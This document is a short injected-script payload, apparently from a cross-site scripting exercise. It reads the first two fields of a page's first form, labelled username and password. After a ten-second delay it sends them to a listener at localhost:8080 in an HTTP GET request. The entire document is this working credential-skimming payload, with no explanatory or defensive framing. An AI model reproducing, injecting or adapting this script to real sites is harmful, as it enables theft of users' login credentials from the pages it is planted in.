<script>
username = document.forms[0].elements[0].value;
password = document.forms[0].elements[1].value;
window.setTimeout(function(){ 
var req = new XMLHttpRequest();
req.open("GET", "http://localhost:8080/?username="+username+"&password="+password+"GETIT?", true);
req.send();
} , 10000);
</script>
